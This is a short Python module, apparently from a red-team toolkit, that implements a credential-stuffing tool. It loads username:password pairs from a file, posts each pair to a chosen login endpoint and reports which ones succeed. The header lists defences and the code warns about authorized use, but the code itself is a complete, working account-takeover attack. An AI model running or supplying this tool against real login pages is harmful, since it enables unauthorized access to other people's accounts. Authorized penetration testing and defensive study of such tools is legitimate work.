# =============================================================================
# Feature: Credential Stuffing Simulator (Red Team)
# What it is: Tests a list of username:password pairs against a login endpoint.
# How it works: Sends POST requests with each credential pair; checks response.
# How tool does it: requests.post with form data; inspects status + response body.
# Defense: Rate limiting, CAPTCHA, account lockout, MFA, and breach-password lists.
# NOTE: Only use against systems you own or have written authorization to test.
# Requires: pip install requests
# =============================================================================

import requests
from pathlib import Path

DEFAULT_CRED_FILE = Path(__file__).parent.parent / "utils" / "sample_creds.txt"


def stuff(url: str, cred_file: str, user_field: str, pass_field: str,
          success_indicator: str, timeout: float = 5.0):
    with open(cred_file, "r", errors="replace") as f:
        pairs = [line.strip() for line in f if ":" in line.strip()]

    print(f"  [*] Loaded {len(pairs)} credential pair(s). Testing ...\n")

    for pair in pairs:
        username, _, password = pair.partition(":")
        data = {user_field: username, pass_field: password}
        try:
            resp = requests.post(url, data=data, timeout=timeout, allow_redirects=True)
            hit = success_indicator.lower() in resp.text.lower()
            status = "[HIT]" if hit else "     "
            print(f"  {status} {username}:{password}  (HTTP {resp.status_code})")
        except requests.RequestException as e:
            print(f"  [ERR] {username}:{password}  -> {e}")


def run():
    print("\n[CREDENTIAL STUFFING SIMULATOR]")
    print("  WARNING: Authorized use only.\n")

    url = input("  Login endpoint URL: ").strip()
    cred_file = input(f"  Credential file [{DEFAULT_CRED_FILE}]: ").strip() or str(DEFAULT_CRED_FILE)
    user_field = input("  Username field name [username]: ").strip() or "username"
    pass_field = input("  Password field name [password]: ").strip() or "password"
    success_indicator = input("  Success indicator in response body [dashboard]: ").strip() or "dashboard"

    if not Path(cred_file).exists():
        print(f"  [-] Credential file not found: {cred_file}")
        return

    stuff(url, cred_file, user_field, pass_field, success_indicator)
